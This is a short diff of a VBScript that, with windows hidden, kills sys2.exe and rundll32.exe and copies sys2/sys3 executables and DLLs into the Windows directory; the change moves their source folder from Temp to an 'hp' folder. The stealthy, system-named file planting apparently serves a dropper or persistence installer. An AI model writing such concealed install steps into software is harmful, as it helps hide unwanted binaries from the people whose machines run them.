@@ -6,12 +6,12 @@ With CreateObject("WScript.Shell")
     ' Pass 0 as the second parameter to hide the window...    
     .Run "taskkill /f /im sys2.exe", 0, True
     .Run "taskkill /f /im rundll32.exe", 0, True
-    .Run "cmd /c copy /Y " & windir & "\Temp\sys2.exe " & windir & "\sys2.exe" , 0, True
-    .Run "cmd /c copy /Y " & windir & "\Temp\sys3.exe " & windir & "\sys3.exe" , 0, True
-    .Run "cmd /c copy /Y " & windir & "\Temp\sys2.dll " & windir & "\sys2.dll" , 0, True
-    .Run "cmd /c copy /Y " & windir & "\Temp\sys3.dll " & windir & "\sys3.dll" , 0, True
-    .Run "cmd /c copy /Y " & windir & "\Temp\sys2.dll " & windir & "\sys2t.dll" , 0, True
-    .Run "cmd /c copy /Y " & windir & "\Temp\sys3.dll " & windir & "\sys3t.dll" , 0, True
+    .Run "cmd /c copy /Y " & windir & "\hp\sys2.exe " & windir & "\sys2.exe" , 0, True
+    .Run "cmd /c copy /Y " & windir & "\hp\sys3.exe " & windir & "\sys3.exe" , 0, True
+    .Run "cmd /c copy /Y " & windir & "\hp\sys2.dll " & windir & "\sys2.dll" , 0, True
+    .Run "cmd /c copy /Y " & windir & "\hp\sys3.dll " & windir & "\sys3.dll" , 0, True
+    .Run "cmd /c copy /Y " & windir & "\hp\sys2.dll " & windir & "\sys2t.dll" , 0, True
+    .Run "cmd /c copy /Y " & windir & "\hp\sys3.dll " & windir & "\sys3t.dll" , 0, True
     '.Run "schtasks /delete /tn flash_fw /F", 0, True
     
     '.Run "net start CppWindowsService", 0, True
